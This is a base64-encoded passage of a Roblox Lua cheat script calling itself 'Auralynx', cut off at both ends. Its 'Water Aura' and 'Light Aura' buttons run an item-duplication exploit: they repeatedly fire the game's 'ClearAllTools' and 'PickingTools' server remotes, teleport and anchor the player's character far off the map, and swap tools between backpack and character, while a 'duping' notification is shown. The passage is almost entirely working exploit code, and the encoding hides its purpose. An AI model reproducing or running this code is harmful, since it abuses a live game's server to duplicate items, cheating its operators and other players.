Rlc2NlbmRhbnRPZihnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICAgIHRvb2wuR3JpcFBvcyA9IGdyaXBQb3MKICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgIHdhcm4oIlRvb2wiLCB0b29sLk5hbWUsICJpcyBub3QgaW4gY2hhcmFjdGVyIikKICAgICAgICAgICAgICBlbmQKICAgICAgICAgIGVuZAogICAgICBlbmQgICAgICAgICAgIAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIFdhdGVyIEF1cmEKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiV2F0ZXIgQXVyYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBuYW1ldG9vbHMgPSAi8J+MiiIKICAgICAgICAgICAgICAgIG9sZGNmcmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJBdXJhbHlueCBpcyBkdXBpbmcuLi4iLFRleHQ9IlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwgQnV0dG9uMSA9ICJPayIgLER1cmF0aW9uPTV9KQogICAgICAgICAgICAgICAgdG9vbHRoYXRpd2FudHRvZHVwZSA9ICJXYXRlcmluZ0NhbiIKICAgICAgICAgICAgICAgIHRvb2xzID0gIldhdGVyaW5nQ2FuIgogICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY2xlYXJ0b29scmVtb3RlOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICBmb3IgbT0xLDIgZG8gdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgICAgICAgICBkdXBpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgbT0xLCAxMjQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHRvb2x0aGF0aXdhbnR0b2R1cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2x0aGF0aXdhbnR0b2R1cGVdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjDg8Kiw4Igw4LCpWHDg8Kiw4Igw4LCpW7Dg8Kiw4Igw4LCpWTDg8Kiw4Igw4LCpWzDg8Kiw4Igw4LCpWUiCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kIHdhaXQoKSB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICB0b29sZ3JpcCA9IHRydWUKICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICB3YWl0KCkKbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQpsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKCgpwcmludCgiZG9uZSIpCndhaXQoMSkKbG9jYWwgR3JpcFBvc1RhYmxlID0gewogICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMCksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDE1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAxNSksClZlY3RvcjMubmV3KDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0xNSksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0zMCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTMwKSwKICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTQ1KSwKICAgIFZlY3RvcjMubmV3KDEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC03NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTc1KSwKCgogICAgIH0KICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3MgPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICAgIAogICAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgICAgZW5kCiAgICAgICAgICBlbmQKICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgTGlnaHQgQXVyYQpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJMaWdodCBBdXJhIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIG5hbWV0b29scyA9ICLwn5KhIgogICAgICAgICAgICAgICAgb2xkY2ZyYW1lID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQpnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIix7VGl0bGU9IkF1cmFseW54IGlzIGR1cGluZy4uLiIsVGV4dD0iUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLCBCdXR0b24xID0gIk9rIiAsRHVyYXRpb249NX0pCiAgICAgICAgICAgICAgICB0b29sdGhhdGl3YW50dG9kdXBlID0gIkZsYXNoTGlnaHQiCiAgICAgICAgICAgICAgICB0b29scyA9ICJGbGFzaExpZ2h0IgogICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY2xlYXJ0b29scmVtb3RlOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICBmb3IgbT0xLDIgZG8gdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgICAgICAgICBkdXBpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgbT0xLCAxMjQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHRvb2x0aGF0aXdhbnR0b2R1cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2x0aGF0aXdhbnR0b2R1cGVdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjDg8Kiw4Igw4LCpWHDg8Kiw4Igw4LCpW7Dg8Kiw4Igw4LCpWTDg8Kiw4Igw4LCpWzDg8Kiw4Igw4LCpWUiCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kIHdhaXQoKSB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICB0b29sZ3JpcCA9IHRydWUKICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICB3YWl0KCkKbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOl